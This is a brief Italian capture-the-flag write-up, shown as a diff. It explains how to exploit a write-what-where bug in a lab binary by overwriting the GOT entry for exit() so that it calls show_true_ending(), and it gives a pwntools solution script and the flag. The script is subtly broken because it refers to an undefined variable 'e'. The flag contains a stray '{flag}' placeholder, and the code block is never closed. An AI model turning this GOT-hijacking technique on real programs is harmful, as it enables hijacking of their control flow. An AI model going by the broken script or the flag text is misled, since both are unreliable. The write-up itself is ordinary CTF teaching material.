@@ -1,0 +1,16 @@
+Il binario fornisce un banale write-what-where; quindi, sarebbe una buona idea sovrascrivere qualche voce nel GOT per ottenere il controllo del flusso di controllo del programma.
+Un buon candidato per la sovrascrittura sarebbe (come al solito) la funzione `exit()`.
+La funzione che ci fornisce il flag è `show_true_ending()`, ma non viene mai chiamata da nessuna parte.
+Sovrascrivendo la voce GOT per `exit()` possiamo chiamare la funzione richiesta e ottenere il flag.
+
+Lo script soluzione con:
+from pwn import *  
+context.binary = "./vuln"
+p = process()
+p.sendline(str(e.got["exit"]).encode("ascii"))
+p.sendline(str(e.functions["show_true_ending"].address).encode("ascii"))
+log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii")) 
+## Flag
+
+```plain
+SPRITZ{GoT_Hijacking_iS_FUn{flag}}
